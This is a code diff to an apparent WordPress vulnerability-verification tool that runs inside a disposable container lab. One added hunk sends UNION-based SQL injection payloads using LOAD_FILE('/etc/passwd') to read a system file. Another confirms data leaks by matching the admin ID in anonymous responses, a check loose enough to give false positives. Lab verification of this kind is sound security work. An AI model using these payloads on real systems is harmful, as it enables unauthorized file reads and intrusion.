@@ -819,6 +819,38 @@ def _finalize_lab(lab: "_Lab", boot: Optional["_LabSession"], res: WpVerifyResul
                              f"→ {'BLOQUEADO (fix OK)' if _blocked else 'AUN ACCESIBLE (fix incompleto?)'}")
             except Exception as _pst_e:
                 res.evidence["patch_smoke_test"] = {"error": str(_pst_e)[:200]}
+        # SQLi file read escalation: after union/error-based SQLi confirmed, try LOAD_FILE
+        # to prove OS-level impact. Best-effort — never affects the verified verdict.
+        if res.verified and boot is not None and not res.evidence.get("sqli_file_read"):
+            _tecnica_fin = res.evidence.get("tecnica", "")
+            _sqli_ep_fin = res.evidence.get("endpoint", "")
+            _sqli_param_fin = res.evidence.get("sqli_param", "")
+            _sqli_m_fin = (res.evidence.get("metodo", "GET") or "GET").upper()
+            if (("union" in _tecnica_fin.lower() or "error" in _tecnica_fin.lower())
+                    and _sqli_ep_fin and _sqli_param_fin):
+                try:
+                    _lf_sess = _make_session()
+                    for _lf_cols in range(1, 9):
+                        _lf_payload = "' UNION SELECT " + ",".join(
+                            ["LOAD_FILE('/etc/passwd')" if i == 0 else str(i + 1)
+                             for i in range(_lf_cols)]) + "-- -"
+                        _lf_r = _lf_sess.request(
+                            _sqli_m_fin, boot.base_url + _sqli_ep_fin,
+                            params={_sqli_param_fin: _lf_payload} if _sqli_m_fin == "GET" else None,
+                            data={_sqli_param_fin: _lf_payload} if _sqli_m_fin != "GET" else None,
+                            timeout=15, allow_redirects=True)
+                        _lf_body = (_lf_r.text or "")
+                        if any(s in _lf_body for s in ("root:", "/bin/bash", "nobody:", "/usr/sbin")):
+                            res.evidence["sqli_file_read"] = {
+                                "file": "/etc/passwd", "confirmed": True,
+                                "payload": _lf_payload, "columns": _lf_cols,
+                                "snippet": _lf_body[:300],
+                            }
+                            step(f"SQLI FILE READ: LOAD_FILE('/etc/passwd') OK — OS file read "
+                                 f"confirmed via SQLi ({_lf_cols} cols)")
+                            break
+                except Exception:
+                    pass
         step("desmontando el laboratorio (contenedores/red/volumen)...")
         lab.teardown()
 
@@ -13289,6 +13321,26 @@ def verify_wordpress_missing_auth_probe(
                                   f"vs {_admin_len}B admin — respuestas difieren, datos privilegiados "
                                   f"expuestos sin autenticacion (prueba por delta auth/anon)")
                     step(f"AUTH DELTA: anon={_anon_len}B vs admin={_admin_len}B — bodies differ → confirmed")
+            except Exception:
+                pass
+
+        # Admin data correlation: if the lab's admin user ID or username appears in the
+        # anonymous response body, it's direct proof that privileged account data leaked.
+        if not res.verified and status == 200 and len(body.strip()) > 10 and boot is not None:
+            try:
+                _admin_markers = []
+                if str(boot.admin_id) in body:
+                    _admin_markers.append(f"admin_id={boot.admin_id}")
+                if boot.admin_user and boot.admin_user.lower() in body.lower():
+                    _admin_markers.append(f"admin_user={boot.admin_user!r}")
+                if _admin_markers:
+                    res.verified = True
+                    res.confidence = "confirmed"
+                    res.evidence["admin_data_in_anon_response"] = {
+                        "markers": _admin_markers, "body_snippet": body[:300]}
+                    res.detail = (f"admin data found in anonymous response: {_admin_markers} "
+                                  f"— privileged information exposed without authentication")
+                    step(f"ADMIN LEAK: {_admin_markers} en respuesta anonima → confirmed")
             except Exception:
                 pass
 
